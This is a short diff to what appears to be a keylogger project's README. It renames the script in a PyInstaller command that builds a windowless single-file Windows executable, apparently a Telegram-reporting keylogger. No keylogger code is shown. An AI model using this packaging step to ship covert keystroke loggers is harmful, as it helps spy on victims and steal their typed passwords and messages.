@@ -66,7 +66,7 @@ Convert to an `.exe` file for Windows:
 
 ```bash
 pip install pyinstaller
-pyinstaller --noconsole --onefile window_keylogger.py
+pyinstaller --noconsole --onefile telegram-logger-hj.py
 ```
 
 Find the executable in the `dist/` folder.
